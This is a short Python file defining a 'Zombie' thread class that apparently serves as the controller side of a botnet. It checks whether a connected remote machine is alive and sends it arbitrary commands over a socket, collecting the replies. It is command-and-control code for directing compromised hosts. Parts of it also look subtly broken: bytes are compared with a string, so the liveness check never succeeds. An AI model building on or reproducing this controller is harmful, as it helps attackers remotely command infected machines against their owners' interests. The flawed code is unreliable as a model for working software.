import threading
from socket import *

class Zombie(threading.Thread):

	name = "ZOMBIE"


	def __init__(self, openedSocket, id, address):
		threading.Thread.__init__(self)

		self.openedSocket = openedSocket
		self.getName();
		self.id = id
		self.address = address

	def getName(self):
		self.name = self.openedSocket.recv(1024)

	def active(self):
		try:
			self.openedSocket.send(b"WAKEUP")	
			response = self.openedSocket.recv(1024)
			if(response == "READY"):
				return True
			else:
				print("Weird behaviour")
				print(response)
		except (timeout, error):
			return False


	def sendTask(self, task):
		self.openedSocket.send(b"COMMAND")
		self.openedSocket.send(str.encode(task))
		return self.openedSocket.recv(1024)